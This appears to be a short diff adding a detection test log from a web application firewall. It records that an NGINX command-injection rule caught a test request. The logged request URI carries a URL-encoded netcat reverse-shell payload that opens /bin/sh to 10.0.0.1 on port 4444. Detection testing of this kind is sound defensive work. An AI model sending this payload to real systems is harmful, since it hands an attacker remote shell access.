@@ -1,0 +1,5 @@
+Pattern ID: CMD_REVSH_002
+        Status: passed
+        Latency: ~26000ms
+        Detection: 1 / 1
+        Rule: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1769326634347-vgxly pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
